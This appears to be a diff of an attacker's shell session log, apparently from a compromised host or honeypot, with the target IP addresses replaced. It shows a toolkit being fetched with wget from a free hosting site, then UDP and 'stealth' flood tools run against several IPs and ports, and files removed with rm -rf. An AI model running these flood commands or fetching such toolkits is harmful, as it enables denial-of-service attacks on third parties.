@@ -48,13 +48,13 @@ wget www12.asphost4free.com/danut/blocked.tgz
 ls
 cd flood
 ls
-./stealth 105.17.75.213 0
+./stealth 184.34.92.153 0
 ls
 cd ..
 ls
-perl up.pl 105.17.75.213 0 0
+perl up.pl 184.34.92.153 0 0
 ls
-perl udp.pl 105.17.75.213 0 0
+perl udp.pl 184.34.92.153 0 0
 ls
 rm -rf yudi
 rm -rf udp.pl.1
@@ -73,9 +73,9 @@ cd flod
 ls
 cd flood
 ls
-perl udp.pl 180.14.151.241 6667 0
+perl udp.pl 144.243.235.198 6667 0
 ls
-./stealth 180.14.151.241 6667
-./stealth 137.160.229.239 22
-./stealth 75.192.204.238 0
-./stealth 80.64.92.132 0
+./stealth 144.243.235.198 6667
+./stealth 45.241.10.173 22
+./stealth 177.41.26.200 0
+./stealth 184.231.119.137 0
